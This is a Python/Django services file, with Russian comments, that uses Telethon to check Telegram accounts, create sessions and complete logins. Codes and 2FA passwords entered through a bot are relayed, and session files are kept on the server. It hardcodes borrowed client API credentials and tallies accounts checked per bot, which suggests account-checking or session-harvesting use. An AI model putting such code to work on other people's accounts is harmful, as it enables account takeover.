# accounts/services.py
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, FloodWaitError
from telethon.tl.types import User
import asyncio
import os
import time
from django.utils import timezone
from django.conf import settings
from .models import UserBot, AuthorizationSession
import requests

# Стандартные API данные для Telegram
DEFAULT_API_ID = '2040'
DEFAULT_API_HASH = 'b18441a1ff607e10a989891a5462e627'


def get_telegram_client(phone_number, user_bot=None):
    """
    Создает клиент Telegram с использованием пользовательского бота
    """
    if user_bot:
        api_id = DEFAULT_API_ID
        api_hash = DEFAULT_API_HASH
    else:
        # Используем системные настройки или значения по умолчанию
        api_id = getattr(settings, 'TELEGRAM_API_ID', DEFAULT_API_ID)
        api_hash = getattr(settings, 'TELEGRAM_API_HASH', DEFAULT_API_HASH)

    # Создаем уникальное имя сессии
    session_name = f"sessions/{user_bot.id if user_bot else 'system'}_{phone_number}"
    os.makedirs('sessions', exist_ok=True)

    return TelegramClient(session_name, api_id, api_hash)


async def check_telegram_account(phone, password=None):
    """
    Проверка аккаунта Telegram на валидность
    """
    client = get_telegram_client(phone)

    try:
        await client.connect()

        if not await client.is_user_authorized():
            return {
                'status': 'UNAUTHORIZED',
                'message': 'Требуется авторизация'
            }

        # Получаем информацию о пользователе
        me = await client.get_me()
        await client.disconnect()

        return {
            'status': 'VALID',
            'username': me.username,
            'premium': getattr(me, 'premium', False),
            'message': 'Аккаунт валиден'
        }

    except SessionPasswordNeededError:
        if password:
            try:
                await client.sign_in(password=password)
                me = await client.get_me()
                await client.disconnect()
                return {
                    'status': 'VALID',
                    'username': me.username,
                    'premium': getattr(me, 'premium', False),
                    'message': 'Аккаунт валиден (2FA пройдено)'
                }
            except Exception as e:
                return {
                    'status': '2FA_FAILED',
                    'message': f'Ошибка 2FA: {str(e)}'
                }
        return {
            'status': '2FA_REQUIRED',
            'message': 'Требуется пароль 2FA'
        }
    except FloodWaitError as e:
        return {
            'status': 'FLOOD_WAIT',
            'message': f'Флуд-контроль: ждите {e.seconds} секунд'
        }
    except PhoneNumberInvalidError:
        return {
            'status': 'INVALID',
            'message': 'Неверный номер телефона'
        }
    except Exception as e:
        return {
            'status': 'ERROR',
            'message': f'Ошибка: {str(e)}'
        }
    finally:
        try:
            await client.disconnect()
        except:
            pass


def sync_check_telegram_account(phone, password=None):
    """
    Синхронная обертка для проверки аккаунта
    """
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(check_telegram_account(phone, password))
    finally:
        loop.close()


async def check_telegram_account_with_bot(phone_number, password=None, user_bot=None):
    """
    Проверка аккаунта через пользовательского бота
    """
    client = get_telegram_client(phone_number, user_bot)

    try:
        await client.connect()

        if not await client.is_user_authorized():
            return {
                'status': 'UNAUTHORIZED',
                'message': 'Требуется авторизация'
            }

        # Получаем информацию о пользователе
        me = await client.get_me()
        await client.disconnect()

        # Обновляем статистику бота
        if user_bot:
            user_bot.accounts_checked += 1
            user_bot.last_used = timezone.now()
            user_bot.save()

        return {
            'status': 'VALID',
            'username': me.username,
            'premium': getattr(me, 'premium', False),
            'message': 'Аккаунт валиден'
        }

    except SessionPasswordNeededError:
        if password:
            try:
                await client.sign_in(password=password)
                me = await client.get_me()
                await client.disconnect()
                return {
                    'status': 'VALID',
                    'username': me.username,
                    'premium': getattr(me, 'premium', False),
                    'message': 'Аккаунт валиден (2FA пройдено)'
                }
            except Exception as e:
                return {
                    'status': '2FA_FAILED',
                    'message': f'Ошибка 2FA: {str(e)}'
                }
        return {
            'status': '2FA_REQUIRED',
            'message': 'Требуется пароль 2FA'
        }
    except FloodWaitError as e:
        return {
            'status': 'FLOOD_WAIT',
            'message': f'Флуд-контроль: ждите {e.seconds} секунд'
        }
    except PhoneNumberInvalidError:
        return {
            'status': 'INVALID',
            'message': 'Неверный номер телефона'
        }
    except Exception as e:
        return {
            'status': 'ERROR',
            'message': f'Ошибка: {str(e)}'
        }
    finally:
        try:
            await client.disconnect()
        except:
            pass


def sync_check_with_bot(phone_number, password=None, user_bot=None):
    """
    Синхронная обертка для проверки через бота
    """
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(
            check_telegram_account_with_bot(phone_number, password, user_bot)
        )
    finally:
        loop.close()


async def create_telegram_session(phone, password=None):
    """
    Создание сессии Telegram
    """
    client = get_telegram_client(phone)

    try:
        await client.connect()

        if await client.is_user_authorized():
            return {
                'success': True,
                'message': 'Сессия уже существует'
            }

        # Запрашиваем код
        sent_code = await client.send_code_request(phone)

        return {
            'success': False,
            'need_code': True,
            'phone_code_hash': sent_code.phone_code_hash,
            'message': 'Требуется ввод кода подтверждения'
        }

    except SessionPasswordNeededError:
        if password:
            try:
                await client.sign_in(password=password)
                return {
                    'success': True,
                    'message': 'Сессия создана (2FA пройдено)'
                }
            except Exception as e:
                return {
                    'success': False,
                    'message': f'Ошибка 2FA: {str(e)}'
                }
        return {
            'success': False,
            'message': 'Требуется пароль 2FA'
        }
    except FloodWaitError as e:
        return {
            'success': False,
            'message': f'Флуд-контроль: ждите {e.seconds} секунд'
        }
    except Exception as e:
        return {
            'success': False,
            'message': f'Ошибка: {str(e)}'
        }
    finally:
        try:
            await client.disconnect()
        except:
            pass


def sync_create_telegram_session(phone, password=None):
    """
    Синхронная обертка для создания сессии
    """
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(create_telegram_session(phone, password))
    finally:
        loop.close()


async def start_telegram_authorization(phone_number, user_bot, chat_id):
    """
    Начало процесса авторизации с отправкой кода
    """
    client = get_telegram_client(phone_number, user_bot)

    try:
        await client.connect()

        # Отправляем код
        sent_code = await client.send_code_request(phone_number)

        # Сохраняем сессию авторизации
        auth_session = AuthorizationSession.objects.create(
            user=user_bot.owner,
            phone_number=phone_number,
            bot=user_bot,
            phone_code_hash=sent_code.phone_code_hash,
            status='WAITING_CODE'
        )

        # Отправляем клавиатуру для ввода кода
        from .telegram_bot_service import TelegramBotService
        bot_service = TelegramBotService(user_bot.bot_token)
        result = bot_service.send_code_keyboard(chat_id, phone_number)

        if result.get('ok'):
            return {
                'success': True,
                'auth_session_id': auth_session.id,
                'message': 'Код отправлен. Проверьте Telegram для ввода кода.'
            }
        else:
            return {
                'success': False,
                'error': 'Ошибка отправки клавиатуры'
            }

    except Exception as e:
        return {
            'success': False,
            'error': f'Ошибка: {str(e)}'
        }
    finally:
        try:
            await client.disconnect()
        except:
            pass


def sync_start_authorization(phone_number, user_bot, chat_id):
    """Синхронная обертка для начала авторизации"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(
            start_telegram_authorization(phone_number, user_bot, chat_id)
        )
    finally:
        loop.close()


async def complete_telegram_authorization(auth_session_id, code):
    """
    Завершение авторизации с введенным кодом
    """
    try:
        auth_session = AuthorizationSession.objects.get(id=auth_session_id)

        if auth_session.is_expired():
            return {
                'success': False,
                'error': 'Время ввода кода истекло'
            }

        client = get_telegram_client(
            auth_session.phone_number,
            auth_session.bot
        )

        await client.connect()

        # Пытаемся войти с кодом
        await client.sign_in(
            phone=auth_session.phone_number,
            code=code,
            phone_code_hash=auth_session.phone_code_hash
        )

        # Если успешно, обновляем сессию
        auth_session.status = 'COMPLETED'
        auth_session.completed_at = timezone.now()
        auth_session.save()

        await client.disconnect()

        return {
            'success': True,
            'message': 'Авторизация успешна'
        }

    except SessionPasswordNeededError:
        # Требуется 2FA пароль
        auth_session.status = 'NEED_2FA'
        auth_session.save()

        return {
            'success': False,
            'need_2fa': True,
            'error': 'Требуется пароль 2FA'
        }
    except Exception as e:
        auth_session.attempts += 1
        if auth_session.attempts >= auth_session.max_attempts:
            auth_session.status = 'FAILED'
        auth_session.save()

        return {
            'success': False,
            'error': f'Ошибка авторизации: {str(e)}'
        }
    finally:
        try:
            await client.disconnect()
        except:
            pass


def sync_complete_authorization(auth_session_id, code):
    """Синхронная обертка для завершения авторизации"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(
            complete_telegram_authorization(auth_session_id, code)
        )
    finally:
        loop.close()


async def complete_2fa_authorization(auth_session_id, password):
    """
    Завершение авторизации с 2FA паролем
    """
    try:
        auth_session = AuthorizationSession.objects.get(id=auth_session_id)

        client = get_telegram_client(
            auth_session.phone_number,
            auth_session.bot
        )

        await client.connect()
        await client.sign_in(password=password)

        auth_session.status = 'COMPLETED'
        auth_session.completed_at = timezone.now()
        auth_session.save()

        await client.disconnect()

        return {
            'success': True,
            'message': 'Авторизация с 2FA успешна'
        }

    except Exception as e:
        return {
            'success': False,
            'error': f'Ошибка 2FA: {str(e)}'
        }
    finally:
        try:
            await client.disconnect()
        except:
            pass


def sync_complete_2fa(auth_session_id, password):
    """Синхронная обертка для 2FA"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(
            complete_2fa_authorization(auth_session_id, password)
        )
    finally:
        loop.close()


def verify_bot_token(bot_token):
    """
    Проверка валидности токена бота
    """
    try:
        # Простой запрос к API Telegram для проверки токена
        response = requests.get(f'https://api.telegram.org/bot{bot_token}/getMe', timeout=10)
        return response.json().get('ok', False)
    except:
        return False